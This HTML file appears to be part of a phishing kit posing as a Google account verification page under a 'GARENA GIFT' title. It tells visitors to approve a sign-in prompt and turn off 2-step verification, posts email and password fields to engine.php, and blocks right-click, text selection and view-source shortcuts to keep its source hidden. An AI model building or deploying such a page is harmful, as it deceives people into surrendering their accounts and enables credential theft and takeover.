<!-- TIDAK DI JUAL -->
<!-- MALING SCRIPT MANDUL !! -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US"> 
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
<div align="center"><noscript>
   <div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
   <div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;">Mohon aktifkan javascript pada browser untuk mengakses halaman ini!</div></div>
</noscript></div>

<!--Kode untuk mencegah seleksi teks, block teks dll.-->
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>

<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>

<style type="text/css">
* : (input, textarea) {
    -webkit-touch-callout: none;
    -webkit-user-select: none;

}
</style>
<style type="text/css">
img {
	-webkit-touch-callout: none;
	-webkit-user-select: none;
    }
</style>

<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
</script>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='http://image.spreadshirtmedia.com/image-server/v1/designs/1001927163,width=280,height=280?mediaType=png' rel='icon' type='image/x-png'/>
<title>GARENA GIFT</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-12 {
 margin:0 auto;
 float:none;

}
</style>
<script type="text/javascript">
	$(document).ready(function(){
	  $("#gsubmit").on("click", function() {
		  var google1 = $("#google1").val();
		  var google2 = $("#google2").val();
		  if(google1==''||google2=='')
{

}
else
{
	var res = document.getElementById("hasilnya");
          res.innerHTML='';
		  $("#gsubmit").prop("disabled", true );
		  $.post("engine.php",
		  {gemail:gemail,gpass:gpass,},
		  function(response,status){
			  $('#hasilnya').html(response);
			$("#gsubmit").prop("disabled", false );
			$("#gemail").prop("value", "");
			$("#gpass").prop("value", "");
		  });
		  return false;
	  }
	  }
	  );
	});

	</script>

<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<center style="background:white;"><br>
<div class="col-md-12">
<h2><img src="http://2.bp.blogspot.com/-mWG63gahjkY/VkaZlqhIsdI/AAAAAAAAUs0/bKXKoeHWjoE/s1600/logo%2Bgoogle%2B2015.png" width="200px" ></h2>
<h3>
  This Form Secured By Google Form.
</h3>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background: #FAF0E6;width100%" class="form-horizontal">
<br/>
<div class="RWIGQ" jsname="OKwYj"><div class="CGVQsc"></div></div><div class="FSCHRd"><div class="aGMYPd" jsname="uPuGNe" role="heading" aria-level="2" tabindex="-1">The Last Step</div><div class="lIbrjf gS2Bvc">Unlock Your Phone. <span jsname="vMgoNd" style="display: none;">Click <b>Next</b> to continue.</span><div class="oOOyEb" jsname="bN97Pc"><div class="swjrDd"><img src="https://ssl.gstatic.com/accounts/marc/authzen_signin.gif" width="125" alt=""></div><div class="m92mTb" role="heading" aria-level="3">Please Tap Yes To Continue </div><div class="BvQA9c">Tap <b>Random Number</b> on the Google prompt.</div>
  </div><b>and turn off 2-step verification of your account</b>
</div><br><br>
<div style="width:100%" class="form-group">

  <a  href="verif.php" class="btn btn-block" style="color: #FFFF00;background-color: #000000;" id="gsubmit"> VERIFICATION </a>			

 </div>
</form>
</div>